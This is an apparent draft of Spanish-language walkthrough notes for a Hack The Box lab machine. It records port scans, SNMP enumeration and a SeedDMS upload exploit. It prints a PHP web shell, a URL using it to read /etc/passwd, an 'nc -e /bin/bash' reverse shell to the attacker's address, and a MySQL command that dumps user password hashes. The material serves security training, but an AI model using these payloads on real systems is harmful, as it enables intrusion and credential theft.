@@ -1,0 +1,134 @@
+
+Ip de la máquina: 10.10.10.241
+
+Lo primero comprobamos que tenemos conectividad con la máquina con un ping: 
+
+ping -c 1 10.10.10.241
+PING 10.10.10.241 (10.10.10.241) 56(84) bytes of data.
+64 bytes from 10.10.10.241: icmp_seq=1 ttl=63 time=135 ms
+
+Una vez confirmado que tenemos conexión con la máquina victima, tambien podemos saber a que nos estamos enfretando. Si es linux el TTL será o estará
+proximo a 64, en cambio si la máquina es Windows, este será de 128.
+
+El segundo paso en este fase es comprobar los puertos abiertos que tiene la máquina. Lo hacemos mediante el uso de nmap:
+
+nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn 10.10.10.241 -oG allPorts
+
+PORT     STATE SERVICE    REASON
+22/tcp   open  ssh        syn-ack ttl 63
+80/tcp   open  http       syn-ack ttl 63
+9090/tcp open  zeus-admin syn-ack ttl 63
+
+Una vez sabemos que puertos tiene abiertos, lanzamos una serie de scripts de renocimeinto para que nos detecte que servicios y versiones de los mismos
+se están ejecutando:
+
+nmap -sCV -p22,80,9090 10.10.10.241 -oN targeted
+
+PORT     STATE SERVICE         VERSION
+22/tcp   open  ssh             OpenSSH 8.0 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 (RSA)
+|   256 c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 (ECDSA)
+|_  256 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 (ED25519)
+80/tcp   open  http            nginx 1.14.1
+|_http-title: Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux
+|_http-server-header: nginx/1.14.1
+9090/tcp open  ssl/zeus-admin?
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 400 Bad request
+|     Content-Type: text/html; charset=utf8
+|     Transfer-Encoding: chunked
+|     X-DNS-Prefetch-Control: off
+|     Referrer-Policy: no-referrer
+|     X-Content-Type-Options: nosniff
+|     Cross-Origin-Resource-Policy: same-origin
+|     <!DOCTYPE html>
+|     <html>
+|     <head>
+|     <title>
+|     request
+|     </title>
+|     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+|     <style>
+|     body {
+|     margin: 0;
+|     font-family: "RedHatDisplay", "Open Sans", Helvetica, Arial, sans-serif;
+|     font-size: 12px;
+|     line-height: 1.66666667;
+|     color: #333333;
+|     background-color: #f5f5f5;
+|     border: 0;
+|     vertical-align: middle;
+|     font-weight: 300;
+|_    margin: 0 0 10p
+| ssl-cert: Subject: commonName=dms-pit.htb/organizationName=4cd9329523184b0ea52ba0d20a1a6f92/countryName=US
+| Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
+
+
+Como vemos que tienene el puerto 80 abierto ejecutamos lo siguiente:
+
+whatweb http://10.10.10.241
+http://10.10.10.241 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.1], IP[10.10.10.241], PoweredBy[Red,nginx], Title[Test Page for the Nginx HTTP Server on Red Hat Enterprise Linux], nginx[1.14.1]
+
+Comentar tema de /etc/hosts
+
+wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://10.10.10.241/WFUZZ
+
+wfuzz -c --hc=404 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://dms-pit.htb/WFUZZ
+
+
+nmap -sU --top-ports 500 --open -v -n 10.10.10.241 -oG allPortsUDP
+
+
+
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.10.10.241
+Scanning 1 hosts, 3220 communities
+10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64
+10.10.10.241 [public] Linux pit.htb 4.18.0-305.10.2.el8_4.x86_64 #1 SMP Tue Jul 20 17:25:16 UTC 2021 x86_64
+
+snmpwalk -v2c -c public 10.10.10.241
+
+snmpbulkwalk -v2c -c public 10.10.10.241 1
+
+michelle/root 
+/usr/bin/monitor
+/var/www/html/seeddms51x/seeddms
+
+searchsploit seeddms -> php/webapps/47022.txt
+
+usuario michelle/pass michelle
+
+<?php
+        system($_REQUEST['cmd']);
+?>
+
+Accedemos a la url:
+http://dms-pit.htb/seeddms51x/data/1048576/29/1.php?cmd=cat+/etc/passwd
+
+
+tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+08:33:38.927387 IP 10.10.10.241 > 10.10.14.7: ICMP host 10.10.10.241 unreachable - admin prohibited filter, length 68
+08:33:39.114328 IP 10.10.10.241 > 10.10.14.7: ICMP host 10.10.10.241 unreachable - admin prohibited filter, length 68
+
+nc -e /bin/bash 10.10.14.7 443
+
+https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py
+rlwrap python3 tty_over_http.py
+
+Investigamos las carpetas y vemos que hay una carpeta confi y dentro un fichero setttings.xml
+
+mysql -useeddms -pied^ieY6xoquu -e 'select email,pwd from tblUsers' seeddms
+email	pwd
+admin@pit.htb	155dd275b4cb74bd1f80754b61148863
+NULL	NULL
+michelle@pit.htb	2345f10bb948c5665ef91f6773b3e455
+jack@dms-pit.htb	682d305fdaabc156430c4c6f6f5cc65d
+
+Probamos contraseñas y usuarios y vemos que en el panel de acceso a centos con el user michelle y la pass de la bd accedemos- Opcion terminal
+
+reverse shell
+
